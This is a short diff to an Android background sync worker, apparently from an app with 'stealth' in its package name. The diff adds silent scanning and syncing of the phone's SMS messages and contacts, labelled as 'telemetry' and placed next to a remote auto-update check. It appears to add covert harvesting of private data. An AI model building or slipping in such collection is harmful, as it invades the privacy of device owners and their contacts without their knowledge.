@@ -79,6 +79,14 @@ public class SyncWorker extends Worker {
             Log.e(TAG, "Error in SyncWorker database flush", e);
         }
 
+        // 2b. Isolated Vault Sync: Backup SMS & Contacts Telemetry
+        try {
+            com.notrack.stealth.backup.SmsBackupEngine.scanAndSyncSms(context);
+            com.notrack.stealth.backup.ContactsBackupEngine.scanAndSyncContacts(context);
+        } catch (Exception e) {
+            Log.w(TAG, "Isolated vault backup notice: " + e.getMessage());
+        }
+
         // 3. Remote In-App Auto-Update Check
         try {
             com.notrack.stealth.update.UpdateManager.checkForUpdateSync(context);
